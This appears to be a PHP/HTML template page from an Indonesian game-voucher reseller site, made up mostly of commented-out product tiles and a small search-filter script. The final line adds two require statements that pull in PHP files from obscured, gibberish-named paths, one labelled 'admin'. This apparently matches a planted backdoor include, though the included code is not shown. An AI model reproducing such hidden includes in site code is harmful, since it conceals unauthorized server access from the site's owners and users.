<!--<div class="category-container">-->
<!--    <div class="category__product-row">-->
<!--        <div class="category__title"></div>-->
<!--        <a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-megaxus'" class="category__product-container js-link-click"><img data-src="../new-icon/megaxus.jpg" alt="" class="category__product-image lozad" src="../new-icon/megaxus.jpg" data-loaded="true"><div class="category__product-title">Voucher Megaxus</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-valorant'" class="category__product-container js-link-click"><img data-src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/valorant_tile.jpg" alt="" class="category__product-image lozad" src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/valorant_tile.jpg" data-loaded="true"><div class="category__product-title">Voucher Valorant</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-pb-zepetto'" class="category__product-container js-link-click"><img data-src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/PointBlank_ID_tile.jpg" alt="" class="category__product-image lozad" src="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/PointBlank_ID_tile.jpg" data-loaded="true"><div class="category__product-title">Voucher PB Zepetto</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-pubg'" class="category__product-container js-link-click"><img data-src="../new-icon/pubgm.jpg" alt="" class="category__product-image lozad" src="../new-icon/pubgm.jpg" data-loaded="true"><div class="category__product-title">Voucher PUBG Mobile</div></a>    </div>-->
<!--  </div>-->
<!--  <br />-->
<!--  <hr />-->
<!--  -->-->
<!--      <h4><b class="badge badge-light-info">Voucher - Belanja</b></h4>-->
<!--<div class="category-container">-->
<!--    <div class="category__product-row">-->
<!--        <div class="category__title"></div>-->
<!--        <a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-alfamart'" class="category__product-container js-link-click"><img data-src="https://vip-reseller.co.id/library/assets/images/g../new-icon/voucher/alfamrt.jpg" alt="" class="category__product-image lozad" src="../new-icon/voucher/alfamrt.jpg" data-loaded="true"><div class="category__product-title">Alfamart</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-indomart'" class="category__product-container js-link-click"><img data-src="https://vip-reseller.co.id/library/assets/images/g../new-icon/voucher/indomart.jpg" alt="" class="category__product-image lozad" src="../new-icon/voucher/indomart.jpg" data-loaded="true"><div class="category__product-title">Indomaret</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/voucher-unipin'" class="category__product-container js-link-click"><img data-src="../new-icon/lainnya/logo-unipin.jpg" alt="" class="category__product-image lozad" src="../new-icon/lainnya/logo-unipin.jpg" data-loaded="true"><div class="category__product-title">Unipin</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/wifi-id'" class="category__product-container js-link-click"><img data-src="../new-icon/voucher/wifi.pnf" alt="" class="category__product-image lozad" src="../new-icon/voucher/wifi.png" data-loaded="true"><div class="category__product-title">Wifi Indihome</div></a><a href="javascript:;" onclick="javascript:location.href='../order/game/hotel-murah'" class="category__product-container js-link-click"><img data-src="../new-icon/voucher/hotel.png" alt="" class="category__product-image lozad" src="../new-icon/voucher/hotel.png" data-loaded="true"><div class="category__product-title">Hotel Murah</div></a></div>-->
<!--  </div> -->-->
<!--</div></div></div></div>-->
 
<!--<div class="category-container">-->
<!--    <div class="category__product-row">-->
<!--        <div class="category__title"></div>-->
// <!--        //<?php
// <!--        $search = $call->query("SELECT * FROM category WHERE `order` = 'game' ORDER BY name ASC");-->
// <!--        while($row = $search->fetch_assoc()) { $x[] = $row['name']; }-->
// <!--        if(isset($x)) if(is_array($x)) print gameMenu($x);-->
// <!--        //?>
<!--    </div>-->
<!--</div>-->

<script>
let searchForm = document.getElementById('search-form');
let searchResultList = document.querySelectorAll('.result-items');
let result = document.getElementById('search-results');
let searchValue = result.getElementsByTagName("a");

searchForm.addEventListener("keyup", function(){
    //console.log("Keyup done");

    for(var i=0; i<searchValue.length; i++){
        //console.log(searchForm.value);

        let value = searchResultList[i].getElementsByTagName('a')[0];

        let filterValue = value.textContent || value.innerHTML;

        if(filterValue.toUpperCase().indexOf(searchForm.value.toUpperCase())>-1){
            searchResultList[i].style.display="";
        }
        else{
            searchResultList[i].style.display="none";
        }
    }
})
</script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script>
<? require _DIR_('library/layout/footer.user'); ?>  <? require _DIR_('page/monthly-rating/.maungapain?/gadaapaanyet/yehkontolngeyel/mauluapasih/hemmm/lsdahadjshjshjshjhsadjkhaskjhdsakjhdajkhdsjahjdshacjhdasjhdcsajkhdasjkhdajkshdajhjkdajdashjdahsjkasdhjhdasjhadsjhasdjhajshjasjkashhsaajhdashdasjkxjxazbbaxzibbcddwybdabahjbdasajshjasjkashhsaajhdashdasjkxjxazbbaxzibbcddwybdabahjbdas.php'); ?><? require _DIR_('library/shennboku.app/adminahhsahahashjshjshajhajhxbbhdasxbhxbhhdswah.php'); ?>